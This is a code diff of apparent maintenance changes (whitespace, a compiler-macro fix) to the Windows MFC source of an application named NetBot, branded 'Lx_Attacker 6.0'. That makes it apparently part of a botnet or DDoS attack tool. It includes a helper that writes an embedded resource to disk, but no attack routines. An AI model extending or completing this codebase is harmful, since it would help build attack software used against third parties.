@@ -65,16 +65,16 @@ BOOL LoadSource(UINT resoure_id , const char * type , const char * filepath)
 {
 	//获得资源指针
 	HRSRC hRsrc = ::FindResource( NULL , MAKEINTRESOURCE( resoure_id ) , type );
-	
+
 	if( hRsrc )
 	{   //获得资源大小
 		DWORD size = ::SizeofResource( NULL , hRsrc );
 		//将资源载入内存
 		HGLOBAL  handle = ::LoadResource( NULL , hRsrc );
-		//写入文件     
+		//写入文件
 		if( handle )
 		{   //定位资源位置
-			BYTE *MemPtr = (BYTE *)LockResource( handle ); 
+			BYTE *MemPtr = (BYTE *)LockResource( handle );
 
 			CFile file;
 
@@ -93,7 +93,7 @@ BOOL LoadSource(UINT resoure_id , const char * type , const char * filepath)
 }
 
 BOOL CNetBotApp::InitInstance()
-{	
+{
 	AfxEnableControlContainer();
 
 	// Standard initialization
@@ -101,7 +101,7 @@ BOOL CNetBotApp::InitInstance()
 	//  of your final executable, you should remove from the following
 	//  the specific initialization routines you do not need.
 
-#if _MVS_VER <= 1200
+#if _MSC_VER <= 1200
 #ifdef _AFXDLL
 	Enable3dControls();			// Call this when using MFC in a shared DLL
 #else
@@ -109,9 +109,8 @@ BOOL CNetBotApp::InitInstance()
 #endif
 #endif
 
-	//提高进程优先级
 	//SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
-	
+
 	CNetBotDlg dlg;
 	m_pMainWnd = &dlg;
 
@@ -119,14 +118,14 @@ BOOL CNetBotApp::InitInstance()
 
 	pSplash=new CSplashScreenEx();
 	pSplash->Create(m_pMainWnd,NULL,CSS_FADE | CSS_CENTERSCREEN | CSS_SHADOW);
-	pSplash->SetBitmap(IDB_LOGO,255,0,255);	
+	pSplash->SetBitmap(IDB_LOGO,255,0,255);
 	pSplash->SetTextFont("MS Sans Serif",100,CSS_TEXT_NORMAL);
 	pSplash->SetTextRect(CRect(20,100,250,120));//左上右下
 	pSplash->SetTextColor(RGB(255,0,0));
 	pSplash->SetTextFormat(DT_SINGLELINE | DT_CENTER | DT_VCENTER);
 	pSplash->SetText("Lx_Attacker 6.0 Version");                  //设置文字
 
-	pSplash->Show(); 
+	pSplash->Show();
 
  //**********************************启动画面*****************************************************/
 
@@ -153,7 +152,7 @@ BOOL CNetBotApp::InitInstance()
 	return FALSE;
 }
 
-int CNetBotApp::ExitInstance() 
+int CNetBotApp::ExitInstance()
 {
 	// TODO: Add your specialized code here and/or call the base class
 	DetachImageList();
@@ -164,11 +163,11 @@ void CNetBotApp::AttachImageList()
 {
 	////////////////////////////
 	//获得指向系统大小图标的句柄
-	SHFILEINFO sfi;	
-	HIMAGELIST hSystemImageList; 
+	SHFILEINFO sfi;
+	HIMAGELIST hSystemImageList;
 
 	TCHAR cWinDir[100];
-	GetWindowsDirectory(cWinDir,100); 	
+	GetWindowsDirectory(cWinDir,100);
 
 	hSystemImageList = (HIMAGELIST)SHGetFileInfo( (LPCTSTR)cWinDir,0, &sfi,sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
 	m_SmallImgList.Attach(hSystemImageList);
